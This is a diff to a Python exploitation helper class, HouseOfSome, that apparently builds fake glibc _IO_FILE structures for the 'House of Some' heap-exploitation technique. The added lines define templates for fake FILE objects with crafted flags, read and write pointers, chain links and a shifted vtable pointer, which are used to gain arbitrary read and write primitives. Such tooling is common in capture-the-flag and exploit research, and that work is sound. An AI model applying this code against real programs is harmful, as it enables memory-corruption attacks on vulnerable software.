@@ -42,6 +42,16 @@ class HouseOfSome:
             0xd8: self.libc.symbols['_IO_wfile_jumps'], # vtable
         }, filler=b"\x00")
 
+        self.hoi_write_template = lambda write_addr, len, _chain: fit({
+            0x00: 0x8000 | 0x800 | 0x1000, #_flags
+            0x20: write_addr, #_IO_write_base
+            0x28: write_addr + len, #_IO_write_ptr
+            0x68: _chain, #_chain
+            0x70: 1, # _fileno
+            0xc0: 0, #_modes
+            0xd8: self.libc.sym["_IO_file_jumps"], #_vtable
+        }, filler=b'\x00')
+
         self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
             0x00: 0x800 | 0x1000, # _flags
             
@@ -54,9 +64,21 @@ class HouseOfSome:
             0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
         }, filler=b"\x00")
 
+        self.hoi_read_template = lambda read_addr, len, _chain: fit({
+            0x00: 0x8000 | 0x40 | 0x1000, #_flags
+            0x20: read_addr, #_IO_write_base
+            0x28: read_addr + len, #_IO_write_ptr
+            0x68: _chain, #_chain
+            0x70: 0, # _fileno
+            0xc0: 0, #_modes
+            0xd8: self.libc.sym["_IO_file_jumps"] - 0x8, #_vtable
+        }, filler=b'\x00')
+
         self.wide_data_length = len(self.fake_wide_data_template())
         self.read_file_length = len(self.fake_file_read_template(0, 0, 0, 0, 0))
         self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))
+        self.hoi_read_length = len(self.hoi_read_template(0, 0, 0))
+        self.hoi_write_length = len(self.hoi_write_template(0, 0, 0))
 
     def _next_control_addr(self, addr, len):
         return addr + len
